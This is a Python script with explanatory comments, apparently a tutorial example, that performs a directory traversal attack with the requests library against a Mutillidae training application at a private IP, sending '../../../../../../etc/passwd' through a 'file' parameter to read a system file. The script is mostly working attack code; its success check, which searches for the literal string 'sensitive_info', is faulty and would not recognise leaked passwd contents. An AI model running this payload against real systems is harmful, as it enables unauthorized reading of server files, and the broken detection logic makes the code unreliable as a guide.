
# Here's another example that demonstrates how to perform a directory traversal attack using Python's `requests` library:

# Directory Traversal Attack

import requests

def perform_directory_traversal(url, vulnerable_parameter, file_path):
    # Construct the URL with the directory traversal payload
    target_url = f"{url}?{vulnerable_parameter}={file_path}"

    try:
        # Send a GET request with the directory traversal payload
        response = requests.get(target_url)

        # Check if the response contains sensitive information
        if "sensitive_info" in response.text:
            print("Directory Traversal Attack successful! Sensitive information leaked.")
        else:
            print("Directory Traversal Attack unsuccessful. The application is likely secure.")

    except requests.exceptions.RequestException as e:
        print(f"HTTP request failed: {e}")

def main():
    # URL of the vulnerable web application
    vulnerable_url = "http://192.168.124.216/mutillidae/"

    # Name of the vulnerable parameter vulnerable to directory traversal
    vulnerable_parameter = "file"

    # File path for the directory traversal attack
    file_path = "../../../../../../etc/passwd"

    print("Performing Directory Traversal Attack...")
    perform_directory_traversal(vulnerable_url, vulnerable_parameter, file_path)

if __name__ == "__main__":
    main()

# We define a function `perform_directory_traversal()` that takes the URL of a vulnerable web application, the name of a vulnerable parameter, and a file path for the directory traversal attack as input.
# We construct a URL with the directory traversal payload by appending the vulnerable parameter and file path.
# We send a GET request to the target URL with the directory traversal payload using the `requests.get()` function.
# We check if the response contains sensitive information (e.g., contents of `/etc/passwd`). If it does, we print a message indicating a successful attack. Otherwise, we print an appropriate error message.
# In the `main()` function, we specify the URL of the vulnerable web application, the vulnerable parameter, and the file path for the attack, and then call the `perform_directory_traversal()` function to execute the attack.

